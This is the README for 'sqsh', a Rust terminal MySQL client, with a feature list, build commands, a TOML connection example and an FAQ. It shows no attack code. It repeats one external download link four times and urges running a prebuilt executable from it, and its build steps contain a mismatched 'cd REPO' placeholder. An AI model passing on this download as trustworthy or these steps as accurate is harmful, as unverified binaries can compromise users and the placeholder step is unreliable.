# sqsh v0.2.0 - TUI MySQL client 2026

> **sqsh is a Rust-powered terminal MySQL client that makes database exploration faster with an interactive TUI, fuzzy selection, and version 0.2.0.**

[![Platform](https://img.shields.io/badge/Platform-Rust%20CLI-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/greenzack/sqsh-rust-mysql-tui?style=flat-square)](https://github.com/greenzack/sqsh-rust-mysql-tui)

---

<p align="center">
  <a href="https://greenzack.github.io/sqsh-rust-mysql-tui/">
    <img src="https://img.shields.io/badge/Download-sqsh%20Latest-brightgreen?style=for-the-badge" alt="Download sqsh">
  </a>
</p>

> **[Download - sqsh v0.2.0](https://greenzack.github.io/sqsh-rust-mysql-tui/)**

---

[Download Latest Build](https://greenzack.github.io/sqsh-rust-mysql-tui/)

---

## What sqsh is

sqsh is a MySQL client for the terminal, implemented in Rust for people who want to stay in the shell while still getting a clean, keyboard-centric way to connect to databases, browse data, and inspect structure.

It is aimed at fast navigation and practical day-to-day database work. Fuzzy picking for connections and tables, along with SSH bastion support, TLS/SSL, and support for multiple saved connections, makes it a good fit when quick discovery and controlled access both matter.

---

## Capabilities

- Interactive terminal UI for browsing and exploring databases
- Fuzzy search to speed up connection and table choice
- SSH bastion support for routed database access
- TOML-based configuration for managing multiple connections
- Connection pooling for repeat database sessions
- Shell command execution from within the client
- Read-only mode for safer inspection-oriented workflows
- TLS/SSL support for encrypted connections
- Secure password handling for saved credentials and prompts

---

## Getting started

Clone the repository and compile it with Rust tooling:

```bash
git clone https://github.com/greenzack/sqsh-rust-mysql-tui.git
cd REPO
cargo build --release
```

Once the build finishes, start the binary from the release target directory:

```bash
./target/release/sqsh
```

If you prefer a prebuilt copy, use the download link above and run the included executable for your platform.

---

## How to use it

Launch sqsh, then pick an existing connection or define one from your saved configuration. The fuzzy selector helps you jump straight to the database or table you need, and the rest of the interface is driven from the keyboard.

Typical workflow:

1. Open sqsh
2. Select a connection from the configured list
3. Search for the target database or table
4. Browse records or metadata in the TUI
5. Run shell commands when needed
6. Switch to read-only mode for inspection-focused sessions

Example launch:

```bash
sqsh
```

When your connection goes through a bastion host or requires TLS, make sure those network settings are present in the connection entry before you start the session.

---

## Configuration

sqsh relies on a TOML configuration file for connection profiles and client settings. Keeping several targets in one file makes it easier to move between environments without re-entering host details or credentials.

Example layout:

```toml
[connections.prod]
host = "db.example.com"
port = 3306
user = "appuser"
database = "appdb"
tls = true
read_only = true

[connections.staging]
host = "staging-db.example.com"
port = 3306
user = "staginguser"
ssh_bastion = "bastion.example.com"
```

Place the config where the application expects it, then add the connections you use most often. Password handling is kept separate from the visible connection fields.

---

## Requirements

- Rust toolchain for building from source
- A MySQL-compatible server
- Terminal support for interactive TUI applications
- Network access to the database host, or a reachable SSH bastion when used
- Optional TLS/SSL support on the server side when encrypted connections are required
- Sufficient permissions for the databases and tables you plan to inspect

---

## FAQ

**How do I add another database?**  
Add a new connection entry to the TOML configuration and restart sqsh, or reload it if your workflow supports that.

**Does sqsh support remote access through a bastion host?**  
Yes, SSH bastion support is included in the available feature set.

**Can I use it for inspection-only sessions?**  
Yes. The read-only mode is useful when you want to browse data without working in a write-oriented session.

**Where should I look if connections are not showing up?**  
Check the TOML file path, confirm the entry names, and verify host, port, user, and network settings.

**What if the interface does not behave well in my terminal?**  
Make sure your terminal supports interactive TUI applications and that the window size is large enough for the layout.

**How are updates handled?**  
Use the latest release or rebuild from the repository to stay on the current version.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
